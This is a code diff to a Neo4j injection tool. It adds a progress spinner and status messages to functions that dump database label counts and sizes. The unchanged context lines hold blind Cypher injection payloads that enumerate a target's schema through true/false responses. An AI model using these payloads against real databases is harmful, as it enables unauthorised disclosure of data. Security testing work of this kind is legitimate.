@@ -459,19 +459,28 @@ class Neo4jInjector:
         return payload
 
     def find_label_count(self):
+        animation = "|/-\\"
+        anim_index = 0
         for count_index in range(1000):
             responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index}"))
+            print(f"[{animation[anim_index % len(animation)]}] dumping label counts, might take awhile", end='\r', flush=True)
+            anim_index += 1
             for response in responses:
                 if (self.check_true(response)):
                     return count_index
+        print(" " * 50, end='\r')
         return 0
 
     def find_label_sizes(self, label_count):
+        animation = "|/-\\"
+        anim_index = 0
         label_sizes_dict = {}
         for count_index in range(label_count):
             break_flag = False
             for size_index in range(1000):
                 responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
+                print(f"[{animation[anim_index % len(animation)]}] dumping label sizes, might take awhile", end='\r', flush=True)
+                anim_index += 1
                 for response in responses:
                     break_flag = self.check_true(response)
                     if (break_flag):
@@ -479,6 +488,7 @@ class Neo4jInjector:
                         break
                 if (break_flag):
                     break
+        print(" " * 50, end='\r')
         return label_sizes_dict
 
     def dump_labels(self, label_sizes):
